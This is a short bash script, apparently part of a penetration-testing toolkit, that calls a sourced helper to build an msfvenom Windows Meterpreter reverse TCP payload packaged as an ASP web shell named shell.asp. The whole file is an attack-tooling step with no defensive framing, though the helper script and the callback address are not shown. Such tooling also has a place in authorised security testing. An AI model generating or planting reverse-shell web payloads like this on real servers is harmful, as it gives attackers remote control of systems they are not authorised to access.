#!/bin/bash

: '
Create ASP file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="windows/meterpreter/reverse_tcp"
format="asp"
filename="shell.asp"

create_reverse_shell "${payload}" "${format}" "${filename}"